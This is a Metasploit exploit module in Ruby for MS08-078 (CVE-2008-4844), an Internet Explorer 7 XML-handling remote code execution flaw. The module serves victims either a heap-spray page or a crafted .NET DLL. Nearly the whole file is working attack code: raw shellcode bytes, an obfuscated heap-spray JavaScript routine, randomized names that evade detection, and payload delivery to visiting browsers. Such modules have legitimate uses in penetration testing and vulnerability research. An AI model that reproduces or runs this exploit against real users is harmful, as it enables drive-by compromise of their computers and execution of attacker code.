## 
#  $Id: ms08_078.rb,v 1.11 2011-03-22 14:41:40-03 nbrito Exp $
##

###########################################################################
#        ___________ _______    ________                                  #
#        \_   _____/ \      \  /  _____/     .__         .__              #
#         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             #
#         |        \/    |    \    \_\  \ /__    __/  /__    __/          #
#        /_______  /\____|__  /\______  /    |__|        |__|             #
#                \/         \/        \/                                  #
#                                                                         #
#                 Exploit Next Generation Methodology                     #
#                            Release 6.00                                 #
#                                                                         #
#                 Copyright (c) 2004-2011 Nelson Brito                    #
#                          All Rights Reserved                            #
#                                                                         #
###########################################################################
# Author: Nelson Brito <nbrito@sekure.org>                                #
#                                                                         #
# Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    #
###########################################################################
# ENG example is free software;  you  may  redistribute and/or  modify it #
# under the terms of the 'GNU General Public License' as published by the #
# Free  Software  Foundation;  Version  2  with  the  clarifications  and #
# exceptions described below.  This guarantees your right to use, modify, #
# and redistribute this software under certain conditions. If you wish to #
# embed ENG technology into  proprietary software,  please,  contact  the #
# author for an alternative license (contact nbrito@sekure.org).          #
#                                                                         #
# NOTICE: THIS EXPLOIT NEXT GENERATION EXAMPLE IS NOT DISTRIBUTED AS PART #
# OF ANY COMMERCIAL OR PUBLIC TOOL AND IS FREELY AVAILABLE. ALTHOUGH THIS #
# EXAMPLE WAS PORTED TO WORK WITH RAPID7 METASPLOIT FRAMEWORK TO SHOW HOW #
# FLEXIBLE ITS APPROACH AND DEPLOYMENT IS.                                #
#                                                                         #
# This  program  is distributed in the hope that it will  be useful,  but #
# WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    #
# Please, refer to GNU General Public License v2.0 for further details at #
# http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document #
# included with ENG.                                                      #
###########################################################################
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0",
		:ua_maxver  => "7.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, # no way to test without just trying it
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MS08-078: Exploit Next Generation Methodology Example Module',
			'Description'    => 'Microsoft Internet Explorer XML Handling Remote Code Execution Vulnerability',
			'Author'         => [ 'Nelson Brito' ],
			'License'        => 'GPLv2',
			'Version'        => '$Revision: 1.11 $',
			'References'     =>
				[
					[ 'CVE', '2008-4844'],
					[ 'OSVDB', '50622' ],
					[ 'BID', '32721' ],
					[ 'MSB', 'MS08-078' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/961051.mspx' ],
					[ 'URL', 'http://fnstenv.blogspot.com/' ],
					[ 'URL', 'http://www.h2hc.com.br/' ],
					[ 'URL', 'http://www.websecforum.com/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
					# Temporary stub virtualalloc() + memcpy() payload to RWX page
					'PrependEncoder' =>
						"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c"+
						"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32"+
						"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07"+
						"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24"+
						"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8"+
						"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64"+
						"\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x54"+
						"\xca\xaf\x91\xff\xd6\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1\xe6\x08"+
						"\x56\x6a\x00\xff\xd0\x89\xc3\xeb\x0d\x5e\x89\xdf\xb9\xe8\x03\x00"+
						"\x00\xfc\xf3\xa4\xff\xe3\xe8\xee\xff\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Microsoft Windows XP SP2-3, 2003 SP1, VISTA SP1 and 2008 SP1 + Internet Explorer 7',
						{
							'Rets'         => [ 0x05050505, 0x08080808,
									    0x09090909, 0x0a0a0a0a,
									    0x0c0c0c0c ],
							'HTMLElements' => [ 'legend',   'marquee',
									    'div',      'label',
									    'span' ],
							'DSObjects'    => [ 'img',      'image' ],
							'HEAPSize'     => [ 256 ],
						},
					],
				],
			'DisclosureDate' => 'April 10th, 2011',
			'DefaultTarget'  => 0))

	end

	def on_request_uri(cli, request)

		@state ||= {}

		ibase = 0x13370000
		vaddr = ibase + 0x2065

		uri,token = request.uri.split('?', 2)

		if(token)
			token,trash = token.split('=')
		end

		if !(token and @state[token])
			token = rand_text_numeric(32)

			if ("/" == get_resource[-1,1])
				dll_uri = get_resource[0, get_resource.length - 1]
			else
				dll_uri = get_resource
			end

			dll_uri << "/generic-" + Time.now.to_i.to_s + ".dll"

			html  = %Q|<html>
				<head>
				<script language="javascript">
					function forward() {
						window.location = window.location + '?#{token}';
					}

					function start() {
						setTimeout("forward()", 2000);
					}
				</script>
				</head>
				<body onload="start()">
					<object classid="#{dll_uri}?#{token}#GenericControl">
					<object>
				</body>
				</html>
			|

			@state[token] = :start

			# Transmit the compressed response to the client
			print_status("Sending #{self.name} init HTML to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, html, { 'Content-Type' => 'text/html' })

			return
		end

		if (uri.match(/\.dll/i))
			print_status("Sending DLL to #{cli.peerhost}:#{cli.peerport}...")

			return if ((p = regenerate_payload(cli)) == nil)

			# First entry points to the table of pointers
			vtable  = [ vaddr + 4 ].pack("V")
			cbase   = ibase + 0x2065 + (256 * 4)

			# Build a function table
			255.times { vtable << [cbase].pack("V") }

			# Append the shellcode
			vtable << p.encoded
			send_response(
				cli,
				Msf::Util::EXE.to_dotnetmem(ibase, vtable),
				{
					'Content-Type' => 'application/x-msdownload',
					'Connection'   => 'close',
					'Pragma'       => 'no-cache'
				}
			)
			@state[token] = :dll
			return
		end

		print_status("Sending exploit HTML to #{cli.peerhost}:#{cli.peerport} token=#{@state[token]}...")

		###########################################################################
		# Star Trek Movie (2009)                                                  #
		###########################################################################
		# -- Kobayashi Maru                                                       #
		###########################################################################
		# Kirk:  The test itself is a cheat,   isn't it?   I mean you program it  #
		#        to be unwinnable.                                                #
		# Spock: Your argument precludes the possibility  of  a no-win scenario.  #
		# Kirk:  I don't believe in no-win scenarios.                             #
		# Spock: Then not only did you violate the  rules,   you also  failed to  #
		#        understand the principal lesson.                                 #
		# Kirk:  Please, enlighten me.                                            #
		# Spock: You of all people should know,   Cadet Kirk.   A captain cannot  #
		#        cheat death.                                                     #
		# Kirk:  I of all people?                                                 #
		# Spock: Your father,   Lieutenant George Kirk,   assumed command of his  #
		#        vessel before being killed in action, did he not?                #
		# Kirk:  I don't think you like the fact that I beat your test...         #
		# Spock: Furthermore, you have failed to divine the purpose of the test.  #
		# Kirk:  Enlighten me again.                                              #
		# Spock: The purpose is to experience fear.  Fear in the face of certain  #
		#        death. To accept that fear, and maintain control of oneself and  #
		#        one's crew.                                                      #
		#        This is a quality expected in every Starfleet captain.           #
		###########################################################################
		# "Sorry, Kirk, you cheated and you failed."                              #
		###########################################################################
		vFirstElement  = rand(target['HTMLElements'].length)
		vSecondElement = rand(target['HTMLElements'].length)
		vDSObject      = rand(target['DSObjects'].length)
		vXMLID         = rand_text_alpha(rand(10) + 10, payload_badchars)
		vXMLWeird      = rand_text_alpha(rand(10) + 10, payload_badchars)
		vXMLData       = rand_text_alpha_upper(10, payload_badchars)
		vXMLEntry      = rand_text_alpha_upper(10, payload_badchars)
		vTriggerME     = rand_text_alpha(rand(10) + 10, payload_badchars)
		vunescape      = rand_text_alpha(rand(10) + 10, payload_badchars)
		vHTML          = ""

		vUserAgent = request.headers['User-Agent']
		if not(vUserAgent =~ /MSIE/)
			send_response(
					cli,
					"<script>window.location.href('about:Blank')</script>", 
					{ 'Content-Type' => 'text/html' }
			)
		end

		##
		# .NET DLL MODE
		##
		if((@state[token] == :dll) and not(vUserAgent =~ /Windows NT 5\.1/))
			vXMLRet1, vXMLRet2 = [vaddr].pack("V").unpack("v*").map{|v| "&##{v};" }
			vXML = "<xml ID=#{vXMLID}><#{vXMLData}><#{vXMLEntry}>"
			case rand(2)
				when 0
					vXML << "&lt;#{target['DSObjects'][vDSObject]} src=\'#{vXMLWeird}://#{vXMLRet1}#{vXMLRet2}.nbrito.net\'/>"
				when 1
					vXML << "<![CDATA[<#{target['DSObjects'][vDSObject]} src=\'#{vXMLWeird}://#{vXMLRet1}#{vXMLRet2}.nbrito.net\'>]]>"
			end
			vXML << "</#{vXMLEntry}></#{vXMLData}></xml>"
			if (vFirstElement == 0)
				vXML << "<fieldset>"
			end
			vXML << "<#{target['HTMLElements'][vFirstElement]} datasrc=##{vXMLID} datafld=#{vXMLEntry} dataformatas=HTML>"
			vXML << "<xml ID=#{vXMLID}></xml>"
			if (vSecondElement == 0)
				vXML << "<fieldset>"
			end
			vXML << "<#{target['HTMLElements'][vSecondElement]} datasrc=##{vXMLID} datafld=#{vXMLEntry} dataformatas=HTML>"
			vXML << "</#{target['HTMLElements'][vFirstElement]}>"
			vXML << "</#{target['HTMLElements'][vSecondElement]}>"
			if (vFirstElement == 0)
				vXML << "</fieldset>"
			end
			if (vSecondElement == 0)
				vXML << "</fieldset>"
			end
			vXML << "<script>setTimeout('window.location.reload(true);', 250);</script>"
			vXML = Rex::Text.to_hex(vXML)

			vHTML =  "<html><head>"
			vHTML << "<script>function #{vTriggerME}(){var #{vunescape} = unescape;document.write(#{vunescape}('#{vXML}'));}</script>"
			vHTML << "</head><body onload=\"#{vTriggerME}()\"></body></html>"
			print_status("Sending #{self.name} using .NET DLL Technique...")	
		##
		# HEAP SPRAY MODE
		##
		else
			return if ((p = regenerate_payload(cli)) == nil)
			shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

			vRet        = rand(target['Rets'].length)
			vReplace    = rand_text_alpha(rand(10) + 10, payload_badchars)
			vTrigger    = rand_text_alpha(rand(10) + 10, payload_badchars)
			vheapSize   = rand_text_alpha(rand(10) + 10, payload_badchars)
			vheapCode   = rand_text_alpha(rand(10) + 10, payload_badchars)
			vheapOffset = rand_text_alpha(rand(10) + 10, payload_badchars)
			vExploit    = rand_text_alpha(rand(10) + 10, payload_badchars)
			heapSpray   = rand_text_alpha(rand(10) + 10, payload_badchars)
			theSpray    = rand_text_alpha(rand(10) + 10, payload_badchars)
			_N          = rand_text_alpha(rand(10) + 10, payload_badchars)
			_B          = rand_text_alpha(rand(10) + 10, payload_badchars)
			_R          = rand_text_alpha(rand(10) + 10, payload_badchars)
			_I          = rand_text_alpha(rand(10) + 10, payload_badchars)
			_T          = rand_text_alpha(rand(10) + 10, payload_badchars)
			_O          = rand_text_alpha(rand(10) + 10, payload_badchars)

			heapSprayLib = "eval(function(#{_N},#{_B},#{_R},#{_I},#{_T},#{_O}){#{_T}=function(#{_R}){return #{_R}.toString(36)};if(!''.replace(/^/,String)){while(#{_R}--){#{_O}[#{_R}.toString(#{_B})]=#{_I}[#{_R}]||#{_R}.toString(#{_B})}#{_I}=[function(#{_T}){return #{_O}[#{_T}]}];e=function(){return'\\\\w+'};#{_R}=1};while(#{_R}--){if(#{_I}[#{_R}]){#{_N}=#{_N}.replace(new RegExp('\\\\b'+e(#{_R})+'\\\\b','g'),#{_I}[#{_R}])}}return #{_N}}('e f(){}f.n=e(9,i,2){1.5=0,1.4,1.b,1.6,1.a,1.3;1.6=j;1.h=((1.6*8)*k);1.4=1.6+9.7;c{2+=2}d(2.7<1.4);1.a=2.g(0,1.4);1.3=2.g(0,(2.7-1.4));c{1.3+=(1.3+1.a)}d((1.3.7+1.4)<1.h);1.b=l m();c{1.b[1.5]+=1.3+9;1.5++}d(1.5<i)}',24,24,'|this|#{_N}|#{_B}|#{_R}|#{_I}|#{_T}|length||#{_O}|H|E|do|while|function|#{heapSpray}|substring|P|J|0x14|1024|new|Array|#{theSpray}'.split('|'),0,{}))"
			heapSprayLib = Rex::Text.to_hex(heapSprayLib)

			vXMLRet1, vXMLRet2 = [target['Rets'][vRet]].pack("V").unpack("v*").map{|v| "&##{v};" }
			vXML = "<xml ID=#{vXMLID}><#{vXMLData}><#{vXMLEntry}>"
			case rand(2)
				when 0
					vXML << "&lt;#{target['DSObjects'][vDSObject]} src=\'#{vXMLWeird}://#{vXMLRet1}#{vXMLRet2}.nbrito.net\'/>"
				when 1
					vXML << "<![CDATA[<#{target['DSObjects'][vDSObject]} src=\'#{vXMLWeird}://#{vXMLRet1}#{vXMLRet2}.nbrito.net\'>]]>"
			end
			vXML << "</#{vXMLEntry}></#{vXMLData}></xml>"
			if (vFirstElement == 0)
				vXML << "<fieldset>"
			end
			vXML << "<#{target['HTMLElements'][vFirstElement]} datasrc=##{vXMLID} datafld=#{vXMLEntry} dataformatas=HTML>"
			vXML << "<xml ID=#{vXMLID}></xml>"
			if (vSecondElement == 0)
				vXML << "<fieldset>"
			end
			vXML << "<#{target['HTMLElements'][vSecondElement]} datasrc=##{vXMLID} datafld=#{vXMLEntry} dataformatas=HTML>"
			vXML << "</#{target['HTMLElements'][vFirstElement]}>"
			vXML << "</#{target['HTMLElements'][vSecondElement]}>"
			if (vFirstElement == 0)
				vXML << "</fieldset>"
			end
			if (vSecondElement == 0)
				vXML << "</fieldset>"
			end
			vXML << "<script>setTimeout('window.location.reload(true);', 250);</script>"
			vXML = Rex::Text.to_hex(vXML)

			vBody = ""
			if (vFirstElement == 0)
				vBody << "<fieldset>"
			end
			vBody << "<#{target['HTMLElements'][vFirstElement]} id=\"#{vReplace}\"></#{target['HTMLElements'][vFirstElement]}>"
			if (vFirstElement == 0)
				vBody << "</fieldset>"
			end

			vJavaScriptRet, crap = [[target['Rets'][vRet]].pack('V').unpack('H*')[0][0,4]].map{|v| "%u#{v}" }

			vJavaScript = %Q|
			setTimeout('window.location.reload(true);', 3000);

			var #{vunescape}   = unescape;
			var #{vheapOffset} = #{vunescape}("#{vJavaScriptRet}#{vJavaScriptRet}");

			eval(#{vunescape}("#{heapSprayLib}"));

			function #{vTriggerME}(){
				var #{vTrigger}  = #{vunescape}("#{vXML}");
				var #{vheapSize} = #{target['HEAPSize']};
				var #{vheapCode} = #{vunescape}("#{shellcode}");
				
				#{heapSpray}.#{theSpray}(#{vheapCode}, #{vheapSize}, #{vheapOffset});

				var #{vExploit} = document.getElementById("#{vReplace}");
				#{vExploit}.innerHTML = #{vTrigger};
			}|

			vHTML = %Q|
			<html>
			<script type="text/javascript" language="javascript">
			#{vJavaScript}
			</script>
			<body onload="#{vTriggerME}()">#{vBody}</body>
			</html>|
			print_status("Sending #{self.name} using HeapSpray Technique...")
		end

		# Transmit the compressed response to the client
		send_response(cli, vHTML, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		handler(cli)
	end
end
